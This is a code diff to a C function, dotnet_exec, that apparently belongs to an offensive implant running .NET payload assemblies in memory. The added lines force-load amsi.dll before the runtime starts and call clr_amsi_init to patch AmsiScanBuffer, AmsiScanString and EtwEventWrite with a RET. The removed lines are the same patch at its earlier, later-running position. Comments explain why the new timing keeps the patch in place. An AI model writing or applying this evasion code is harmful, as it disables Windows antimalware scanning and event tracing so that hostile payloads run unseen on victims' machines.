@@ -373,6 +373,18 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
     if (!asm_bytes || asm_len < 2) return _strdup("dotnet_exec: empty payload");
     if (!load_oleaut32()) return _strdup("dotnet_exec: oleaut32.dll load failed");
 
+    // Pre-load and patch AMSI before any CLR code runs.
+    // The CLR loads amsi.dll lazily during Assembly.Load() — patching after
+    // Start() is too late because ev_get_module() returns NULL when amsi.dll
+    // isn't in the PEB yet.  LoadLibraryA forces amsi.dll into the PEB first,
+    // then clr_amsi_init() patches AmsiScanBuffer/AmsiScanString/EtwEventWrite.
+    // When the CLR later calls AmsiInitialize it finds the DLL already present
+    // and reuses the same mapping — our RET patch stays in place.
+    if (child_mode) {
+        LoadLibraryA("amsi.dll");
+        clr_amsi_init();
+    }
+
     // Capture pipe handle BEFORE CLR init — ICorRuntimeHost::Start() may reset
     // standard handles internally (same as observed in the Go agent).
     HANDLE hPipe = INVALID_HANDLE_VALUE;
@@ -433,11 +445,6 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
         SetStdHandle(STD_OUTPUT_HANDLE, hPipe);
         SetStdHandle(STD_ERROR_HANDLE,  hPipe);
     }
-
-    // Patch AMSI+ETW NOW — ICorRuntimeHost::Start() loads amsi.dll into the
-    // process. Patching before Start() is a no-op because amsi.dll is not yet
-    // present and ev_get_module() returns NULL. Must happen before Load_3().
-    clr_amsi_init();
 
     // ── GetDefaultDomain → QI _AppDomain ────────────────────────────────────
     typedef HRESULT (WINAPI *pfnGDD)(void*, IUnknown**);
